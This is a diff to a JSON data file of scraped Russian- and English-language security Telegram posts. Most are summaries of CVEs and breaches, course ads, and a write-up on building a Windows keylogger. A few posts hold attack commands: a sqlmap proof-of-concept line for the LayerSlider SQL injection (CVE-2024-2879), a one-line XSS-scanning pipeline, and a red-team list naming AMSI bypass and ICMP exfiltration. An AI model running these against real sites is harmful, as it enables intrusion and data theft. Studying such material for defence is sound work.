@@ -17,6 +17,7 @@
     "date": "2024-04-24",
     "from_channel": "defcon_news",
     "message": "Grafana backend sql injection affected all version\nhttps://www.reddit.com/r/netsec/comments/1cbrrg8/grafana_backend_sql_injection_affected_all_version/",
+    "urls": [],
     "webpage_description": "Explore this post and more from the netsec community",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/1cbrrg8/grafana_backend_sql_injection_affected_all_version/"
 }
@@ -28,7 +29,23 @@
 {
     "date": "2024-04-22",
     "from_channel": "sysadm_in_channel",
-    "message": "MagicDot: A Hacker’s Magic Show of Disappearing Dots and Spaces\n\nThis action is completed by most user-space APIs in Windows. By exploiting this known issue, I was able to uncover:\n\n🔹 One remote code execution (RCE) vulnerability (CVE-2023-36396) in Windows’s new extraction logic for all newly supported archive types that allowed me to craft a malicious archive that would write anywhere I chose on a remote computer once extracted, leading to code execution.\n🔹 Two elevation of privilege (EoP) vulnerabilities: one (CVE-2023-32054) that allowed me to write into files without the required privileges by manipulating the restoration process of a previous version from a shadow copy and another that allowed me to delete files without the required privileges.\n\nWith Demo..:\n\nhttps://www.safebreach.com/blog/magicdot-a-hackers-magic-show-of-disappearing-dots-and-spaces/"
+    "message": "MagicDot: A Hacker’s Magic Show of Disappearing Dots and Spaces\n\nThis action is completed by most user-space APIs in Windows. By exploiting this known issue, I was able to uncover:\n\n🔹 One remote code execution (RCE) vulnerability (CVE-2023-36396) in Windows’s new extraction logic for all newly supported archive types that allowed me to craft a malicious archive that would write anywhere I chose on a remote computer once extracted, leading to code execution.\n🔹 Two elevation of privilege (EoP) vulnerabilities: one (CVE-2023-32054) that allowed me to write into files without the required privileges by manipulating the restoration process of a previous version from a shadow copy and another that allowed me to delete files without the required privileges.\n\nWith Demo..:\n\nhttps://www.safebreach.com/blog/magicdot-a-hackers-magic-show-of-disappearing-dots-and-spaces/",
+    "urls": []
+}
+{
+    "date": "2024-04-20",
+    "from_channel": "elliot_cybersec",
+    "message": "❗️ Client-side RCE в Telegram Desktop: разбор с POC\n | Привет, друг. На связи Эллиот.\n\nНедавно все паблики пестрили о \"новой уязвимости\" в Telegram Desktop для Windows, которая позволяет злоумышленнику исполнять произвольный код при открытии чата с ним, если у вас включена автозагрузка файлов (она включена по умолчанию).\n\n- Разбор уязвимости, реальный proof of concept и пару слов о том, как защититься, ждут вас под катом.\n\n⏺ Ссылка на чтиво\n\n#RCE #POC #0day #Telegram"
+}
+{
+    "date": "2024-04-19",
+    "from_channel": "it_secur",
+    "message": "😈 RedTeam Tips: Orchestrating Chaos, Evading defense.\n\n•  Shellcode to ASCII String;\n•  API Tips;\n•  Wmicexec Evasion;\n•  Exfiltration;\n - Linux Binaries;\n - Nameless Excel Macro;\n - Hide Malware Using Volume Shadow Copy;\n - Usermode Hook Bypass;\n - Process Instrumentation Callback;\n - Overpass-the-Hash;\n•  Reconnaissance;\n - Process Injections;\n - Local Code Injection;\n - DLL Injection;\n - Remote Thread Injection;\n - Thread Hijacking;\n - Classic APC;\n - Early Bird APC;\n - Binary Proxy Execution;\n - Active Directory Reversible Encryption;\n - RPC;\n - Privilege Escalation with LDAP;\n - Elevate access with the SeLoadDriverPrivilege permission;\n - Upgrade access with TRUSTWORTHY database in SQL Server;\n - Payload development in smb or webdav;\n - amsi one line bypass;\n - Transfer Dns in Linux;\n - Execute the exfil command and transfer its information with icmp.\n\n#Пентест"
+}
+{
+    "date": "2024-04-19",
+    "from_channel": "elliot_cybersec",
+    "message": "👩‍💻 Поиск уязвимостей XSS одной командой | Привет, друг. На связи Эллиот.\n\nДля этого нам потребуется предварительно установить несколько утилит на языке GO (ну и соответсвенно сам GO тоже должен быть установлен).\n\nВ роли краулера утилита - gospider, представляющая собой веб-краулер для быстрого сбора URL-адресов, связанных с сайтом.\n\nВторая - qsreplace. Она принимает на вход URL-адреса и заменяет все значения строки запроса на значение, указанное пользователем.\n\nПоследний и самый важный инструмент поиска на XSS - dalfox. Это производительный и быстрый инструмент для анализа параметров запроса и выявления различных типов XSS и других базовых уязвимостей.\n\nПосле установки необходимо заменить строку https://example.com на адрес тестируемого сайта и выполнить команду:\n\ngospider -s https://example.com -c 10 -d 5 --blacklist \".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)\" --other-source | grep -e \"code-200\" | awk '{print $5}' | grep \"=\" | qsreplace -a | dalfox pipe -o result.txt"
 }
 {
     "date": "2024-04-17",
@@ -41,9 +58,10 @@
     "message": "🖋️ Critical Atlassian Flaw Exploited to Deploy Linux Variant of Cerber Ransomware 🖋️\n\nThreat actors are exploiting unpatched Atlassian servers to deploy a Linux variant of Cerber aka C3RB3R ransomware. The attacks leverage CVE202322518 CVSS score 9.1, a critical security vulnerability impacting the Atlassian Confluence Data Center and Server that allows an unauthenticated attacker to reset Confluence and create an administrator account. Armed with this access, a.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
 }
 {
-    "date": "2024-04-22",
+    "date": "2024-04-17",
     "from_channel": "sysadm_in_channel",
     "message": "/ Palo Alto - Putting The Protecc In GlobalProtect (CVE-2024-3400)\n\nA command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.\n\nTechnial details:\n\n- https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/\n\nUp:\n\n- https://www.paloaltonetworks.com/blog/2024/04/more-on-the-pan-os-cve/",
+    "urls": [],
     "webpage_description": "Welcome to April 2024, again. We’re back, again.\n\nOver the weekend, we were all greeted by now-familiar news—a nation-state was exploiting a “sophisticated” vulnerability for full compromise in yet another enterprise-grade SSLVPN device.\n\nWe’ve seen all the commentary around the certification process of these devices for certain",
     "webpage_url": "https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/"
 }
@@ -51,6 +69,7 @@
     "date": "2024-04-15",
     "from_channel": "defcon_news",
     "message": "Приглашаем на курс SQL Injection Master, запись до 24 апреля.\nhttps://codeby.net/threads/priglashaem-na-kurs-sql-injection-master-zapis-do-24-aprelja.83295/",
+    "urls": [],
     "webpage_description": "Друзья, приглашаем вас на курс SQL Injection Master, где подробно разбирается эксплуатация SQL-инъекций, одной из наиболее опасных атак на веб-приложения. Вы освоите базовый синтаксис языка...",
     "webpage_url": "https://codeby.net/threads/priglashaem-na-kurs-sql-injection-master-zapis-do-24-aprelja.83295/"
 }
@@ -58,6 +77,16 @@
     "date": "2024-04-15",
     "from_channel": "cibsecurity",
     "message": "🖋️ Palo Alto Networks Releases Urgent Fixes for Exploited PAN-OS Vulnerability 🖋️\n\nPalo Alto Networks has released hotfixes to address a maximumseverity security flaw impacting PANOS software that has come under active exploitation in the wild. Tracked as CVE20243400 CVSS score 10.0, the critical vulnerability is a case of command injection in the GlobalProtect feature that an unauthenticated attacker could weaponize to execute arbitrary code with root.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
+}
+{
+    "date": "2024-04-12",
+    "from_channel": "elliot_cybersec",
+    "message": "Как обнаружить SQL-уязвимость?\nОсвойте методы атаки и защиты на курсе SQL Injection Master! Аналогов по объему практики в СНГ и EN-cегменте нет.\n\nНа курсе подробно разберём эксплуатацию SQL-инъекций, одну из наиболее опасных и эксплуатируемых видов атак на веб-приложения. Вы освоите базовый синтаксис языка запросов SQL, внедрение SQL-кода в уязвимые приложения, раскрутку SQL-инъекций вручную и софтом, а также способы защиты своих веб-приложений.\n\nCтарт: 15 апреля\nПродолжительность: 3 месяца\n\n🏆 Выдаём УПК/сертификат  \n\nПолучите промодоступ к обучению - 7 дней бесплатно!\n\n@Codeby_Academy\n84994441750"
+}
+{
+    "date": "2024-04-11",
+    "from_channel": "elliot_cybersec",
+    "message": "🥷 Ладья на XSS: как я хакнул chess.com детским эксплойтом | Привет, друг. На связи Эллиот\n\nВ этой статье я расскажу о том, как использовал свои знания по кибербезопасности для обнаружения XSS-уязвимости (Cross-Site Scripting, межсайтовый скриптинг) на крупнейшем шахматном сайте интернета со 100 миллионами участников – Chess.com. \n\n— Но для начала небольшое вступление (в котором будет затронута немного менее серьёзная, но достаточно занятная, уязвимость OSRF (On-site Request Forgery, подделка запросов на сайте)\n\n⏺ Ссылка на чтиво\n\n❗️ Также прикрепляю полезные материалы по теме #XSS:\n- Ликбез по распространенным Client-Side уязвимостям\n- ТОП-3 инструмента для XSS\n- Как использовать XSS в метатегах и hidden полях\n\n#XSS #OSRF"
 }
 {
     "date": "2024-04-11",
@@ -68,18 +97,25 @@
     "date": "2024-04-11",
     "from_channel": "sysadm_in_channel",
     "message": "/ CVE-2024-3273: D-Link NAS RCE Exploited in the Wild\n\nA remote code execution vulnerability in D-Link NAS devices is actively being exploited and is tracked under CVE-2024-3273. The vulnerability is believed to affect as many as 92,000 devices\n\nhttps://www.greynoise.io/blog/cve-2024-3273-d-link-nas-rce-exploited-in-the-wild",
+    "urls": [],
     "webpage_description": "Check out this blog to stay informed about a critical remote code execution vulnerability affecting D-Link NAS devices. It is being tracked under CVE-2024-3273 and believed to affect as many as 92,000 devices.",
     "webpage_url": "https://www.greynoise.io/blog/cve-2024-3273-d-link-nas-rce-exploited-in-the-wild"
 }
 {
     "date": "2024-04-09",
     "from_channel": "proxy_bar",
-    "message": "CVE-2024-2879 LayerSlider плагин для WordPress\n*\nВерсии LayerSlider 7.9.11 - 7.10.0 - Unauthenticated SQL Injection\n*\nНедостаточне экранирование позволяет добавлять дополнительные SQL-запросы к уже существующим, как итог = можно использовать для извлечения конфиденциальной информации из базы данных.\n*\nPOC usage:\nsqlmap \"https:://OLOLO.com/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=\" --risk=3 --level=4 --dbms=mysql --technique=T or sqlmap -r request.txt --risk=3 --level=4 --dbms=mysql --technique=T\n\n\n#wordpress"
+    "message": "CVE-2024-2879 LayerSlider плагин для WordPress\n*\nВерсии LayerSlider 7.9.11 - 7.10.0 - Unauthenticated SQL Injection\n*\nНедостаточне экранирование позволяет добавлять дополнительные SQL-запросы к уже существующим, как итог = можно использовать для извлечения конфиденциальной информации из базы данных.\n*\nPOC usage:\nsqlmap \"https:://OLOLO.com/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=\" --risk=3 --level=4 --dbms=mysql --technique=T or sqlmap -r request.txt --risk=3 --level=4 --dbms=mysql --technique=T\n\n\n#wordpress",
+    "urls": []
 }
 {
     "date": "2024-04-06",
     "from_channel": "proxy_bar",
     "message": "CVE-2024-30850\n*\nchaos-rat RCE\n*\nexploit"
+}
+{
+    "date": "2024-04-06",
+    "from_channel": "Social_engineering",
+    "message": "🌐 Создаем кейлоггер для Windows.\n\n•  Во Франции есть ИБ компания Synacktiv, которая занимается пентестом и разработкой необходимых инструментов для их деятельности. В их блоге я заметил интересную и актуальную статью, где описан процесс написания кейлоггера для Windows, способного поддерживать все раскладки клавиатуры и правильно реконструировать символы Юникода независимо от языка. Материал разделен на 3 части и вот его содержимое:\n\n - В первой части, авторы описывают три различных способа захвата нажатий клавиш (GetKeyState, SetWindowsHookEx, GetRawInputData ) и различия между этими методами.\n\n - Во второй части подробно описан процесс, как Windows хранит информацию о раскладках клавиатуры в файле kbd*.dll и как ее анализировать.\n\n - В третьей и заключительной части разложен процесс использования извлеченной информации для преобразования скан-кодов в символы и все сложные случаи, представленные различными раскладками, такими как лигатуры, мертвые клавиши, дополнительные состояния сдвига и SGCAPS.\n\n•  Учитывайте, что статья на английском, но скоро появится перевод всех частей от Yashechka на форуме XSS. Если не можете зарегистрироваться на форуме, то следите за материалом в нашем канале @it_secur, я опубликую ссылки и материал в PDF формате, когда он выйдет. Но лучше изучить материал в оригинале:\n\n➡ Читать статью [1], [2], [3].\n\nS.E. ▪️ infosec.work ▪️ VT"
 }
 {
     "date": "2024-04-04",
